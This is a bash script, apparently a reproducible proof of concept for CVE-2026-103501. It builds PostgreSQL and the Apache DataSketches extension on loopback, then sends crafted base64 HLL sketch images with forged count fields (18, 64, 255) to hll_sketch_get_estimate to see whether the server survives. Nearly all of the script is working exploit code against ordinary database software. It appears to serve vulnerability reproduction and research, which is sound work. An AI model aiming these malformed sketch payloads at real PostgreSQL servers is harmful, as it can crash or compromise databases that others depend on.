#!/usr/bin/env bash
# Reproducible loopback-only probe of CVE-2026-103501 in the shipped
# Apache DataSketches PostgreSQL extension. Never binds off 127.0.0.1.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/run-out"}
PORT=${DS2_PG_PORT:-59217}
PG="$HERE/pg-install/bin"
EXT="$HERE/datasketches-postgresql-master"
mkdir -p "$OUT"

(cd "$HERE" && sha256sum -c SHA256SUMS) > "$OUT/pins.log"
(cd "$HERE/../frontier/datasketches2shell/src" && sha256sum -c SHA256SUMS) > "$OUT/lib-pin.log"

if [ ! -x "$PG/postgres" ]; then
  (cd "$HERE" && tar -xjf postgresql-16.4.tar.bz2 &&
   cd postgresql-16.4 &&
   ./configure --prefix="$HERE/pg-install" --without-readline --without-zlib \
     --without-icu --without-llvm CFLAGS='-O0 -g' > "$OUT/configure.log" 2>&1 &&
   make -j2 > "$OUT/pg-build.log" 2>&1 && make install > "$OUT/pg-install.log" 2>&1)
fi
if [ ! -f "$PG/../lib/datasketches.so" ]; then
  (cd "$HERE" && tar -xzf datasketches-postgresql.tar.gz &&
   mkdir -p v52 && tar -xzf ../frontier/datasketches2shell/src/5.2.0.tar.gz \
     -C v52 --strip-components=1)
  cp "$HERE/Makefile.hll" "$EXT/Makefile.hll"
  (cd "$EXT" && make -f Makefile.hll -j2 > "$OUT/ext-build.log" 2>&1 &&
     make -f Makefile.hll install > "$OUT/ext-install.log" 2>&1)
fi

if [ ! -s "$HERE/pgdata/PG_VERSION" ]; then
  "$PG/initdb" -D "$HERE/pgdata" -A trust --no-instructions > "$OUT/initdb.log" 2>&1
  printf "listen_addresses='127.0.0.1'\nport=%s\nunix_socket_directories='%s'\n" \
    "$PORT" "$HERE" >> "$HERE/pgdata/postgresql.conf"
fi
if ! "$PG/pg_ctl" -D "$HERE/pgdata" status >/dev/null 2>&1; then
  "$PG/pg_ctl" -D "$HERE/pgdata" -l "$OUT/server.log" \
    -o "-h 127.0.0.1 -p $PORT" start >/dev/null
fi
trap '"$PG/pg_ctl" -D "$HERE/pgdata" stop -m fast >/dev/null 2>&1 || true' EXIT

"$PG/dropdb" -h 127.0.0.1 -p "$PORT" --if-exists ds2probe >/dev/null
"$PG/createdb" -h 127.0.0.1 -p "$PORT" ds2probe
"$PG/psql" -h 127.0.0.1 -p "$PORT" -d ds2probe -q \
  -f "$EXT/sql/datasketches_hll_sketch.sql" > "$OUT/ddl.log" 2>&1

python3 - "$OUT" <<'PY'
import base64, pathlib, sys
out = pathlib.Path(sys.argv[1])
seed = bytes.fromhex("02010708030802002bf2fb06862ff90d")
def image(count, value=0x5a):
    buf = bytearray([value]) * (8 + count * 4)
    buf[:min(len(seed), len(buf))] = seed[:len(buf)]
    buf[6] = count
    return bytes(buf)
for name, img in [("benign", seed), ("c18", image(18)),
                  ("c64", image(64)), ("c255", image(255))]:
    b64 = base64.b64encode(img).decode()
    (out / (name + ".sql")).write_text(
        "SELECT 'PG_DS2_%s ' || hll_sketch_get_estimate('%s'::hll_sketch)::text;\n"
        % (name.upper(), b64))
PY

for f in benign c18 c64 c255; do
  echo "=== $f ==="
  "$PG/psql" -h 127.0.0.1 -p "$PORT" -d ds2probe -f "$OUT/$f.sql" 2>&1
done
echo "=== server alive ==="
"$PG/psql" -h 127.0.0.1 -p "$PORT" -d ds2probe -Atc 'select 1;'
